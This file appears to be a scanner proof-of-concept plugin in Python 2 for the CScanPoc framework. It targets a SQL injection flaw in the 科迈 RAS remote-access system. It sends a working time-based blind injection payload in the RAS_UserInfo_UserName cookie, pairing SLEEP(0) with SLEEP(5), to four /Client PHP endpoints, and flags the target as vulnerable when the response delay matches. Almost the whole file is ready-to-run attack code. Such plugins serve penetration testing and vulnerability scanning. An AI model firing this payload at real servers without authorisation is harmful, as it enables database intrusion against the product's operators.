# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    poc_id = '503a7ed4-43fb-461f-9738-feef82017a57'
    name = '科迈RAS系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        科迈RAS系统，函数过滤不全导致SQL注射。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '科迈'  # 漏洞应用名称
    product_version = '科迈RAS系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4aac2340-8487-4e9a-bd22-144b204729b6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            urls = [
                "/Client/CmxList.php",
                "/Client/CmxLogin.php",
                "/Client/CmxUpdate.php",
                "/Client/CmxSupport.php"
            ]
            for url in urls:
                url = self.target + url
                cookie = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(0)))JarV)%20AND%20'aSBL'='aSBL"
                cookie1 = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20'aSBL'='aSBL"
                t1 = time.time()
                code1, _, _, _, _ = hh.http(url,cookie=cookie)
                true_time = time.time() - t1
                t2 = time.time()
                code2, _, res, _, _ = hh.http(url,cookie=cookie1)
                false_time = time.time() - t2
                if code1==200 and code2 == 200 and false_time-true_time>4.5:
                    #security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
